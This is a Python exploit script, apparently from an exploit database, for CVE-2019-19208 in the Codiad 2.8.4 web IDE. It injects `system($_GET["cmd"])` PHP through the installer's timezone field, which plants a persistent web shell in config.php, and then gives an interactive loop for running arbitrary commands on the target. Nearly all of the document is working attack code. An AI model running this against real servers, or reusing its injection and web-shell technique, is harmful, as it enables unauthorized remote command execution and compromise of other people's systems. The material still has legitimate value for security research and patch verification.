# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)
# Date: 21.05.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Credits to: https://herolab.usd.de/security-advisories/usd-2019-0049/ (Tobias Neitzel)
# Vendor Homepage: http://codiad.com/
# Software Link: https://github.com/Codiad/Codiad/releases/tag/v.2.8.4
# Version: 2.8.4
# Tested on: Xubuntu 20.04 and Cent OS 8.3
# CVE: CVE-2019-19208

'''
Description:
An unauthenticated attacker can inject PHP code before the initial configuration
that gets executed and therefore he can run arbitrary system commands on the server.
'''


'''
Import required modules:
'''
import requests
import json
import sys
import time


'''
User-Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]


'''
Determining target:
--> The installationpaths to select from are derived from the installation instructions from:
        https://github.com/Codiad/Codiad/wiki/Installation
'''
print('Enter one of the following numbers to proceed')
print('[1]: OS of the target: Higher than Ubuntu 13.04; path: /var/www/html/')
print('[2]: OS of the target: Ubuntu 13.04 or below; path: /var/www/')
print('[3]: OS of the target: CENT OS; path: /var/www/html/')
selection = int(input('Your Choice: '))
if selection == 3 or selection == 1:
    path = "/var/www/html"
    content_len = "191"
if selection == 2:
    path = '/var/www'
    content_len = '185'


'''
Get cookie
'''
session = requests.Session()
link = 'http://' + target_ip + ':' + target_port + '/'
response = session.get(link)
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')


'''
Construct header:
'''
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.',
    'Accept': '*/*',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': content_len,
    'Origin': 'htttp://' + target_ip,
    'Connection': 'close',
    'Referer': 'http://' + target_ip + '/',
    'Cookie': cookie,
}


'''
Construct body:
'''
string = """'"); system($_GET["cmd"]); print("'"""
body = {
    'path': path,
    'username': 'test',
    'password': 'exploit',
    'password_confirm': 'exploit',
    'project_name': 'hello',
    'project_path': path + '/data',
    'timezone': str(string)
}


'''
Post the request with the malaicious payload
'''
print('Posting request with malicious payload')
link = link + '/components/install/process.php'
x = requests.post(link, headers=header, data=body)
print('Waiting 10 seconds')
time.sleep(10)


'''
Create payload / persistend command execution:
'''
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Cookie': cookie,
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'mag-age=0'
}
payload = input('Input the command, which should be executed on the targeted machine. To abort enter EXIT: ')
while payload != 'EXIT':
    link_payload = 'http://' + target_ip + ':' + target_port + '/config.php?cmd=' + payload
    x = requests.get(link_payload, headers=header)
    print(x.text)
    payload = input('Input the command, which should be executed on the targeted machine. To abort enter EXIT: ')